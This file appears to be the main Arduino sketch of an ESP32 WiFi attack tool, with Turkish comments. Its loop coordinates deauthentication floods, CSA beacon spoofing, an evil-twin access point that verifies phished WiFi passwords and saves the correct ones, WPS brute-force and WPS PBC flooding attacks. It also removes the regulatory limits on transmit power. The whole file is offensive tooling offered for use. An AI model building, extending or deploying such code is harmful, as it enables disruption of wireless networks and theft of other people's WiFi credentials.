#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_pm.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "definitions.h"
#include "wps_attack.h"

int curr_channel = 1;

static unsigned long last_csa_send = 0;
static unsigned long last_retrack  = 0;

// ─── Maks Performans ─────────────────────────────────────────────────────────
// Hafif sürüm — mod geçişlerinde ve loop'ta güvenle çağrılabilir.
// WiFi.setSleep / esp_pm_configure BURADA YOK: bunlar WiFi stack'i sıfırlar,
// sadece setup()'ta bir kez çağrılır.
void apply_max_performance() {
  setCpuFrequencyMhz(160);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(84);  // 84 × 0.25 = 21 dBm
  esp_wifi_set_protocol(WIFI_IF_AP,
    WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
}

// En hafif yol — her loop iterasyonunda çağrılır
// WPS PBC handshake sırasında esp_wifi_set_ps STA state machine'ini bozar — koru
void reapply_wifi_power() {
  esp_wifi_set_max_tx_power(84);
  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
}

// ─── WiFi Olay İşleyici ───────────────────────────────────────────────────────
// Mod geçişi, WPS, bağlantı/kesilme gibi her olayda TX gücü + PS geri uygula
static void on_wifi_event(WiFiEvent_t event) {
  esp_wifi_set_max_tx_power(84);
  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
}

// ─── Tek seferlik başlatma ───────────────────────────────────────────────────
// WiFi stack'i sıfırlayan işlemler burada, sadece setup()'ta çağrılır.
static void one_time_hw_init() {
  // Bluetooth tamamen devre dışı — kullanılmıyor, sadece güç tüketiyor
  btStop();

  // Regulatory TX limiti kaldır — IDF kendi başına gücü kısıtlamasın
  wifi_country_t country;
  memset(&country, 0, sizeof(country));
  country.cc[0]        = '0';
  country.cc[1]        = '0';
  country.schan        = 1;
  country.nchan        = 13;
  country.max_tx_power = 20;
  country.policy       = WIFI_COUNTRY_POLICY_MANUAL;
  esp_wifi_set_country(&country);

  // Arduino WiFi uyku katmanını kapat (esp_wifi_set_ps'den bağımsız)
  WiFi.setSleep(false);

  // CPU PM kilidi: OS dinamik frekans düşürme + light sleep tamamen kapalı
#if defined(CONFIG_IDF_TARGET_ESP32C3)
  esp_pm_config_esp32c3_t pm_cfg = {
    .max_freq_mhz       = 160,
    .min_freq_mhz       = 160,
    .light_sleep_enable = false
  };
  esp_pm_configure(&pm_cfg);
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
  esp_pm_config_esp32s3_t pm_cfg = {
    .max_freq_mhz       = 240,
    .min_freq_mhz       = 240,
    .light_sleep_enable = false
  };
  esp_pm_configure(&pm_cfg);
#else
  esp_pm_config_esp32_t pm_cfg = {
    .max_freq_mhz       = 240,
    .min_freq_mhz       = 240,
    .light_sleep_enable = false
  };
  esp_pm_configure(&pm_cfg);
#endif
}

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  passwords_init();

  // Ağır tek-seferlik donanım başlatma — WiFi başlamadan önce
  one_time_hw_init();

  // WiFi olaylarına abone ol — her olay TX gücünü geri yükler
  WiFi.onEvent(on_wifi_event);

  // APSTA modunda başla — WPS saldırısı başlatılırken mod değişimi olmaz,
  // AP hiç kapanmaz. STA arayüzü WPS / şifre testi için hazır bekler.
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(AP_SSID, AP_PASS);

  // softAP TX gücü sıfırlayabilir — hemen geri uygula
  apply_max_performance();

  start_web_interface();
  DEBUG_PRINTLN("Hazir. 192.168.4.1 adresine baglanin.");
}

void loop() {
  // Her iterasyonda TX gücü + PS zorla sabit
  reapply_wifi_power();

  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);

  } else if (evil_twin_active) {
    if (et_test_pending && !et_result_ready) {
      bool wps_was_running = et_wps_pbc_running;
      if (wps_was_running) {
        et_stop_wps_pbc();
        delay(300);
      }

      et_result_correct = evil_twin_test_password(et_tested_password);
      et_result_ready   = true;
      et_test_pending   = false;
      reapply_wifi_power();

      if (et_result_correct) {
        passwords_save(et_tested_ssid, et_tested_password);
        stop_evil_twin();
        led_on();
      } else if (wps_was_running) {
        delay(800);
        et_start_wps_pbc();
      }
    }
    evil_twin_loop();
    web_interface_handle_client();

  } else if (wps_attack_state == WPS_ATTACKING) {
    wps_loop();
    web_interface_handle_client();

  } else if (wps_pbc_attack_state == WPS_PBC_MONITORING ||
             wps_pbc_attack_state == WPS_PBC_CONNECTING) {
    // WPS PBC non-blocking durum makinesi — beacon izleme veya handshake aktif
    wps_pbc_loop();
    web_interface_handle_client();

  } else {
    web_interface_handle_client();

    // Evil Twin ertelenmiş başlatma — redirect sonrası buraya gelir
    if (et_start_pending) {
      et_start_pending = false;
      start_evil_twin(et_start_wifi_number);
    }

    // Ağ listesi yeniden tarama — redirect sonrası buraya gelir
    if (rescan_pending) {
      rescan_pending = false;
      web_interface_do_rescan();
    }

    // WPS tarama — redirect gönderildikten sonra buraya gelir, AP sağlam kalır
    if (wps_scan_pending) {
      wps_scan_pending = false;
      wps_scan();
    }

    // WPS saldırı başlatma — redirect gönderildikten sonra buraya gelir
    if (wps_attack_pending) {
      wps_attack_pending = false;
      wps_start_attack(wps_attack_pending_idx);
    }

    // WPS PBC izleme+bağlantı — redirect sonrası buraya gelir
    if (wps_pbc_monitor_pending) {
      wps_pbc_monitor_pending = false;
      wps_pbc_start(wps_pbc_pending_idx);
    }

    // WPS PBC flood — küçük blocking operasyon, sadece N paket gönderir
    if (wps_pbc_flood_pending) {
      wps_pbc_flood_pending = false;
      wps_pbc_flood(wps_pbc_pending_idx, 50);
    }

    unsigned long now = millis();

    if (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0') {
      if (now - last_csa_send >= CSA_INTERVAL_MS) {
        last_csa_send = now;
        send_csa_beacon();
      }
      if (now - last_retrack >= RETRACK_INTERVAL_MS) {
        last_retrack = now;
        retrack_deauth_target();
      }
    }
  }
}
